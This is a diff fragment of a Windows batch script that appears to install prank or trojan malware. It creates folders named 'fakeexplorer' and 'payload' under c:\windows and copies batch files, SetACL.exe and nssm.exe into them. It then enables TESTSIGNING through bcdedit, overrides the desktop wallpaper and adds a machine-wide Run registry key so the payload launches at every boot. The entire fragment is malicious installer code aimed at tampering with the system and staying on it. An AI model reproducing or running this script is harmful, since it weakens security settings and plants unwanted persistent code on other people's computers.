@@ -209,12 +209,12 @@ mkdir c:\windows\fakeexplorer
 mkdir c:\windows\payload
 mkdir c:\windows\wallpapertroll
 mkdir c:\windows\junkins
-mkdir c:\windows\junkins\startup
-mkdir c:\windows\junkins\walp
 mkdir c:\windows\junkins\nssm
 xcopy "%CD%\junkins\startup\no.bat" "c:\windows\fakeexplorer" /y /q /h
 xcopy "%CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat" /y /q /h
 xcopy "%CD%\junkins\walp\walp.bmp" "c:\windows\wallpapertroll\walp.bmp" /y /q /h
+xcopy "%CD%\junkins\startup\SetACL.exe" "c:\windows\junkins\startup\SetACL.exe" /y /q /h
+xcopy "%CD%\junkins\nssm\nssm.exe" "c:\windows\junkins\nssm\nssm.exe" /y /q /h
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv5 /t REG_SZ /d c:\windows\payload\startup.bat
